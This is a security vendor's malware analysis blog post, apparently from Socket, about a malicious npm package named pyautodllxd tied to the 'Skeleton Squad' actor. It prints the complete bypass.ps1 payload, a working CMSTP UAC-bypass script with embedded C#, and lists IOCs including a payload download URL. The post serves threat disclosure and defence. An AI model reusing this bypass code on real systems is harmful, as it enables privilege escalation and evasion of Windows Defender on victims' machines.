@@ -1,0 +1,141 @@
+
+The "Skeleton Squad" first burst onto the scene on February 23rd, when a threat actor unleashed a torrent of malicious packages onto the PyPi ecosystem. The group's intriguing name "EsqueleSquad," or "Skeleton Squad" translated from Catalan, was linked to several packages uploaded in early January, all of which cleverly drop malicious executables using various methods.
+The Socket research team has recently discovered that the JavaScript package manager npm is also being targeted by these attacks. This suggests that these malicious actors are expanding their tactics to target different programming language ecosystems, posing a security risk for developers and users relying on packages through npm, yarn, and pnpm.
+The latest combatant to enter the fray is an NPM package known as pyautodllxd. This seemingly innocuous package was uploaded by an author named 'T4hg' and last updated on April 18, 2023.
+At first glance, 'pyautodllxd' doesn't appear to impersonate any popular package or engage in typosquatting. Its purpose and target audience remain elusive, as both the Readme file and description were left blank. However, when we examined the postinstall command, we uncovered a trove of suspicious code.
+The Hidden Threat: A Closer Look at 'pyautodllxd'#
+The postinstall command runs a PowerShell command, suggesting that the attacker targets Windows operating systems. Upon closer inspection, we discovered a binary named 'esquele.exe' being downloaded from a Dropbox URL. This stealthy approach allows the payload to be deployed without raising any red flags.
+Malicious install script:
+After installation, the package simultaneously downloads the malicious executable and saves it in the temp folder for later execution.
+Decoded PowerShell script:
+At this point we decided to collect passive intelligence and we observed that several vendors had marked this binary as a malicious trojan.
+Unleashing the Trojan: Dynamic Analysis of 'pyautodllxd'#
+Our dynamic analysis revealed that the executable runs a hidden PowerShell window, downloads a script named bypass.ps1, and uses the "Esquele" function to add exclusion paths for drives C:\ and D:\, thereby bypassing Windows Defender's real-time protection.
+The payload file bypass.ps1:
+function Esquele {
+    param(
+        [Parameter()]
+        [string]$Executable,
+        [Parameter()]
+        [string]$Command
+    )
+    if (![System.IO.File]::Exists($Executable)) {
+        $Executable =  (Get-Command $Executable).Source
+         if (![System.IO.File]::Exists($Executable)) {
+                exit
+         }
+    }
+    if ($Executable.ToLower() -eq "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe") 
+    {
+        if ($Command -ne "") {
+            $final = "powershell -c ""$Command"""
+    }
+    } elseif  ($Executable.ToLower() -eq "C:\Windows\system32\cmd.exe") 
+    {
+        if ($Command -ne "") 
+        {
+            $final = "cmd /c ""$Command"""
+        }
+  } else 
+  {
+    $final =  "$Executable $Command"
+  }
+$sign = '$chicago$'
+$code = @"
+using System;
+using System.Threading;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Windows;
+using System.Runtime.InteropServices;
+public class CMSTPBypass
+{
+public static string InfData = @"[version]
+Signature=$sign
+AdvancedINF=2.5
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+[RunPreSetupCommandsSection]
+LINE
+taskkill /IM cmstp.exe /F
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+[AllUSer_LDIDSection]
+""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
+[Strings]
+ServiceName=""ERROR""
+ShortSvcName=""ERROR""
+";
+    [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)] 
+    static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd); 
+    [DllImport("user32.dll")]
+    static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+    [DllImport("user32.dll")]
+    static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
+    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
+    public static string SetInfFile(string CommandToExecute) {
+        StringBuilder OutputFile = new StringBuilder();
+        OutputFile.Append("C:\\windows\\temp");
+        OutputFile.Append("\\");
+        OutputFile.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
+        OutputFile.Append(".inf");
+        StringBuilder newInfData = new StringBuilder(InfData);
+        newInfData.Replace("LINE", CommandToExecute);
+        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
+        return OutputFile.ToString();
+    }
+    public static bool Execute(string CommandToExecute) {
+        const int WM_SYSKEYDOWN = 0x0100;
+        const int VK_RETURN = 0x0D;
+        StringBuilder InfFile = new StringBuilder();
+        InfFile.Append(SetInfFile(CommandToExecute));
+        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
+        startInfo.Arguments = "/au " + InfFile.ToString();
+        IntPtr dptr = Marshal.AllocHGlobal(1); 
+        ShellExecute(dptr, "", BinaryPath, startInfo.Arguments,  "", 0);
+        Thread.Sleep(5000);
+        IntPtr WindowToFind = FindWindow(null, "ERROR");
+        PostMessage(WindowToFind, WM_SYSKEYDOWN, VK_RETURN, 0);
+        return true;
+    }
+}
+"@
+Add-Type $code
+[CMSTPBypass]::Execute($final)
+Stop-Process -Name "cmstp" -Force
+}
+The bypass.ps1 script employs the CMSTP bypass technique, a popular exploit among attackers to circumvent security restrictions and execute malicious commands. This technique takes advantage of the trust and elevated privileges associated with the CMSTP.exe binary, a legitimate Windows component responsible for managing Connection Manager service profiles.
+Stay Vigilant, Stay Protected#
+Previously, attacks by this threat actor were confined to PyPI. However, our findings suggest that this threat actor is now targeting npm.
+Deployed through a user account named "esquelesquad", these packages harbored harmful code within their "setup.py", which triggered the malware to spring into action upon download. This opened the floodgates to a host of cyber threats, including spyware and information-stealing malware.
+Just like the npm variant, the PyPI malware was also powered by a Base64-encoded PowerShell command that kick-started the download of a Windows remote executable from a Dropbox link. This first executable served as a stage 1 dropper, setting off a second stage that spawned multiple malware binaries on the user's computer.
+Despite the swift action of the Python security team in removing these malicious packages, the threat actor remained undeterred, continuing to exploit the user account to spread additional packages.
+Adding to their activities, the Skeleton Squad left a cryptic message in Spanish in some of the packages published by T4hg, which translates to "They will all die in the hands of EsqueleSquad."
+We've noted several Indicators of Compromise (IOCs) during our analysis of the malicious npm packages, including various IP addresses and URLs. You can find the full list and VirusTotal report in the links provided at the end of this post.
+At Socket, we're committed to staying ahead of the curve and ensuring your JavaScript, Python – and now Go dependencies – are safe from such threats. Install Socket for GitHub to protect your projects immediately. The install process takes 2-3 clicks and it starts working right away – no configuration necessary.
+- The Socket Security Team
+IOCs
+
+fp2e7a.wpc.2be4.phicdn.net
+fp2e7a.wpc.phicdn.net
+ifconfig.me
+rentry.co
+hxxps://cdn.discordapp.com/attachments/1090710876639744062/1102575056925761587/bypass2.ps1
+104.86.182.8
+192.229.211.108
+192.229.221.95
+20.99.133.109
+20.99.184.37
+20.99.185.48
+20.99.186.246
+23.216.147.64
+23.216.147.76
+
+pyautodllxd
+bypass.ps1
+bypass.ps1
+bypass.ps1
+CMSTP.exe
